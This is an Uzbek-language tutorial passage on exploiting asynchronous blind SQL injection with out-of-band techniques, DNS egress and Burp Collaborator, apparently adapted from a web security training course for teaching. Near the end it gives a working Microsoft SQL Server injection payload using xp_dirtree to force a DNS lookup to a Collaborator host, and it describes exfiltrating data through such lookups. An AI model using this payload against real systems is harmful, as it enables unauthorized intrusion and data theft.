## Blind SQL injection’ni **out-of-band (OAST)** texnikalari yordamida ekspluatatsiya qilish

Ilova oldingi misoldagidek SQL so‘rovini bajarishi mumkin, ammo uni **asinxron** tarzda amalga oshiradi. Ya’ni, ilova foydalanuvchining so‘rovini asosiy oqimda qayta ishlashda davom etadi, SQL so‘rovini esa boshqa oqim yordamida `tracking cookie` orqali bajaradi.

So‘rov hali ham SQL injection’ga zaif bo‘lsa-da, ilgari ko‘rib chiqilgan texnikalar bu yerda ishlamaydi. Chunki:

* Ilovaning javobi SQL so‘rovi qaytaradigan ma’lumotga bog‘liq emas
* Ma’lumotlar bazasi xatosi yuz berishiga bog‘liq emas
* Yoki so‘rovni bajarish uchun ketgan vaqtga ham bog‘liq emas.

Bunday holatda, blind SQL injection zaifligini **o‘z nazoratingizdagi tizimga tashqi tarmoq o‘zaro ta’sirlarini** (network interactions) majburlab yuborish orqali ekspluatatsiya qilish mumkin bo‘ladi. Bunday o‘zaro ta’sirlar injekt qilingan shartga qarab birma-bir ma’lumotni aniqlash uchun ishlatilishi mumkin. Bundan ham foydaliroq usuli — ma’lumotlarni to‘g‘ridan-to‘g‘ri shu tashqi tarmoq o‘zaro ta’siri orqali **exfiltratsiya qilish** (ya’ni, chiqarib yuborish).

Buning uchun turli xil tarmoq protokollaridan foydalanish mumkin, ammo odatda eng samaralisi bu **DNS (domain name service)** hisoblanadi. Chunki ko‘plab ishlab chiqarish (production) tarmoqlari normal tizimlarning ishlashi uchun zarur bo‘lgani sababli DNS so‘rovlarini tashqariga chiqishga (egress) ruxsat beradi.

Out-of-band texnikalardan foydalanish uchun eng oson va eng ishonchli vosita bu **Burp Collaborator** hisoblanadi. Bu server turli xil tarmoq xizmatlarining (DNS ham qo‘shilgan) maxsus implementatsiyalarini taqdim etadi. U sizga zaif ilovaga yuborilgan ma’lum **payload** natijasida tarmoq o‘zaro ta’sirlari yuzaga kelganini aniqlash imkonini beradi.

**Burp Suite Professional** ichida Burp Collaborator bilan darhol ishlashga sozlangan maxsus mijoz (client) mavjud. Batafsil ma’lumot uchun Burp Collaborator hujjatlariga murojaat qilishingiz mumkin.

---

**DNS so‘rovlari yuborilishini qo‘zg‘atish texnikalari** ishlatilayotgan ma’lumotlar bazasiga xosdir. Masalan, **Microsoft SQL Server** da quyidagi input orqali ma’lum domen bo‘yicha DNS lookup’ni majburlash mumkin:

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Bu kod ma’lumotlar bazasini quyidagi domen bo‘yicha DNS lookup amalga oshirishga majbur qiladi:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```
